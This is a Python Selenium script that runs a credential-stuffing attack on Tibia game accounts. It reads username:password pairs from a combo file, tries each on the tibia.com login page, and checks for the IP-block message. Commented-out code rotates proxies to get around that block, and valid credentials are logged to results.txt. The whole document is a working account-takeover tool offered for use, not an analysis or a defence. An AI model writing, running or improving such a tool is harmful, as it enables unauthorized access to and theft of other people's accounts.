from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException


class Credential:
  def __init__(self, username, password):
    self.username = username
    self.password = password


def getProxyListFromFile():
    proxyList = []
    f=open("PROXY-LIST.txt","r")
    f1 = f.readlines()
    for line in f1:
        proxyList.append(line)
    return proxyList

def saveCredntialResultToFile(credential,fileName):
    f=open(fileName, "a+")
    f.write(credential.username + ":" + credential.password)
    f.close()

#getProxyFrom proxylist
def getProxy(proxyId,proxy):
    lenght = len(proxy)
    if lenght >  proxyId :
        return proxy[proxyId]
    raise ValueError('The Proxy limit was reached , stoped program')


def getCredentialsFromFile():
    credentials = []
    f=open("TIBIA-MIX.txt", "r")
    f1 = f.readlines()
    for line in f1:
        result = line.split(':')
        username = result[0]
        password = result[1]
        crednetial = Credential(username,password)
        credentials.append(crednetial)
    f.close()
    return credentials

def resolveException(exceptionMessage,credential):
    f=open('exceptions.txt', "a+")
    f.write("Exception message: " + exceptionMessage + " Credentials:" + credential.username + ":" + credential.password)
    f.close()


# def goWithProxy(credential):
#     global proxyId,isProxy,cookie,timeout
#     isProxy = True
#     proxyId = proxyId + 1 
#     proxy = getProxy()
#     print("Going with proxy:"+proxy)
#     chrome_options = webdriver.ChromeOptions()
#     chrome_options.add_argument('--proxy-server=%s' % proxy)
#     browser = webdriver.Chrome(options=chrome_options)
  
  
   
#     try:        
#         errorMessage = errorMessage = browser.find_element_by_class_name('ErrorMessage')
#         errorText = errorMessage.text
#         print("Trying  to login with following credentials")
#         print(credential.username + ":"  + credential.password) 
#         print(errorText)
#         ipBlockText = "Wrong account data has been entered from your IP address too often. You are unable to log in from this IP address for the next 30 minutes. Please wait."
#         if ipBlockText in errorText:
#             print("Block ip error")
#             goWithProxy(credential)
#     except:
#         print('Error Message not found')
#         resolveException('Error Message not found',credential)
#     if browser != None:
#         cookie = browser.get_cookie('SecureSessionID')

#     #browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))

#     if cookie != None:
#         print("Cookie found, logged succesfuly with credentials:" + credential.username + ":" + credential.password)
#         saveCredntialResultToFile(credential,"results.txt") 
#     if browser !=  None:
#         browser.quit()

#Return True in succes login false on fail
def loginToTibiaAccount(credential,browser):
    usernameStr = credential.username
    passwordStr = credential.password
    print('Trying to login by following account ' + usernameStr + ' ' )
    try:
        browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))
        username = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'loginname')))
        username.send_keys(usernameStr)
        password = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'loginpassword')))
        password.send_keys(passwordStr)
    except TimeoutException:
        print("Timeout exception")
        resolveException('Tiemout exception',credential)
        return False
    except:
        print('Some another exception occured')
        resolveException('Some another exception occured',credential)
        return False
    return True

def checkErrorMessage(browser,credential):
    try:        
        errorMessage = browser.find_element_by_class_name('ErrorMessage')
        errorText = errorMessage.text
        ipBlockText = "Wrong account data has been entered from your IP address too often. You are unable to log in from this IP address for the next 30 minutes. Please wait."
        if ipBlockText in errorText:
            print("Block ip error")
            return False
    except:
        print("Error message not found")
        resolveException('Error message not found',credential)
        return True
    return False

def loginWithCredential(credential,timeout):
    cookie = None

    browser = webdriver.Chrome()
    browser.set_page_load_timeout(timeout)
    isSuccessLogin = loginToTibiaAccount(credential,browser)
    isErrorMessageNotFound = checkErrorMessage(browser,credential)

    if(isSuccessLogin and isErrorMessageNotFound):
        cookie = browser.get_cookie('SecureSessionID')
        if cookie != None:
            print("Cookie found, logged succesfuly with credentials:" + credential.username + ":" + credential.password)
            saveCredntialResultToFile(credential,"results.txt") 
    browser.quit()

def processLogin(timeout):
    proxyId = -1
    proxyId = 0

    proxyList = getProxyListFromFile()
    credentials = getCredentialsFromFile()

    for credential in credentials:
       loginWithCredential(credential,timeout)